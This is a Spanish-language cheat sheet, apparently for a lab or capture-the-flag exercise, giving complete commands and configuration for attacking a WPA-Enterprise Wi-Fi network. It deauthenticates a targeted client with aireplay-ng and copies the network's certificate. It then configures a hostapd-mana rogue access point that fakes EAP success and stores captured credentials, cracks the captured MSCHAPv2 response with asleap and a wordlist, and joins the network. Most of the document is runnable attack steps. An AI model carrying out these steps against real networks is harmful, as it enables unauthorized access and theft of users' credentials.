### 1. Matar procesos activos
    sudo airmon-ng check kill

### 2. Iniciar modo monitor
    sudo airmon-ng start wlan0

### 3. Iniciar el proceso de captura y monitorización
    sudo airodump-ng wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/aabb93c4-6970-4fe9-bef4-3be2fa68be7c)

### 4. Iniciar captura y monitoreo de una red específica
    sudo airodump-ng -c 2 -w Playtronics wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/fbdd3c10-f6d9-430e-968f-110b7fcaa1cd)

### 5. Desautenticación en redes Wi-Fi
    sudo aireplay-ng -0 1 -a E8:9F:80:03:63:4A -c 40:B8:9A:F5:BB:19 wlan0mon

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/1e610701-d29d-4c99-8fe0-9f2678134813)

### 6. Detener modo monitor
    sudo airmon-ng stop wlan0mon

### 7. Abrir archivo *.cap con Wireshark
    sudo wireshark Playtronics-01.cap

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/76170b14-6a5b-472f-a944-c2a190a1d0cd)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/4b5460ed-7f9a-4df7-9b35-704555733ee6)

### 8. Revisar el certificado
    openssl x509 -inform der -in cert.der -text

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/db294efd-3989-4bd0-afe8-027041800b84)

### 9. Convertir certificado de DER a PEM
    openssl x509 -inform der -in cert.der -outform pem -out output.crt

### 10. Abrir *.crt
    cat output.crt

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/b647b7b2-5d37-4f03-8437-3704192f2806)

### 11. Configurar CA
    sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
    
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/f8439657-9651-4f76-af3c-cc5a17121e88)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0a773e18-26fb-4704-b8ec-95851e7e23b9)

### 12. Configurar Servidor
    sudo mousepad /etc/freeradius/3.0/certs/server.cnf

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/2e89a53d-bb92-4d7e-a55d-54e75b1a192c)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0a3c1be0-4166-4720-98d7-7a8eaa40dfd8)

### 13. Compilar cambios
```
sudo -s
```
```
cd /etc/freeradius/3.0/certs/    
```
```
rm dh
```
```
make
```
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/7163a4a2-60e1-4687-8311-b06d53031ce3)
```
exit
```

### 14. Configuración de mana
```
sudo mousepad /etc/hostapd-mana/mana.conf
```
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/7f3291d4-29a3-4b4c-a423-ec640e6688d3)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/bb4512bc-0877-41db-a518-38062e6a83cc)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/59812d86-98cb-44d4-8261-c2d6276d3b8b)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/4d9359ef-3af4-4604-92f4-5a4d2985911e)
```
sudo mousepad /etc/hostapd-mana/mana.eap_user
```
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/ead46ca8-3062-49c7-9ecb-35fe974bcaa1)

### 15. Atacar la red

    sudo hostapd-mana /etc/hostapd-mana/mana.conf

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/0e59b626-081c-4855-b61d-ec4b23c29661)

### 16. Crackeando la clave
    asleap -C 45:c3:ff:4f:8c:99:b1:53 -R 72:77:33:c5:c3:61:49:9e:48:12:3e:5d:b3:6d:db:10:af -W /usr/share/john/password.lst

![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/e0ea3340-c9b8-4f3f-b077-5b652a9294e4)
![image](https://github.com/deyvisgabriel/CheatSheet/assets/15914267/bf4b010c-c8c8-494e-95de-690adb69c8d1)

### 17. Conectando a la red
```
nano wpa_supplicant.conf
```
```
network={
    ssid="tu_ssid"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="dominio\usuario"
    password="contraseña"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"
}
```
```
wpa_supplicant -i wlan0 -c wpa_supplicant.conf
```
```
dhclient wlan0
```
### 18. Bandera
    curl http://<IP>/proof.txt





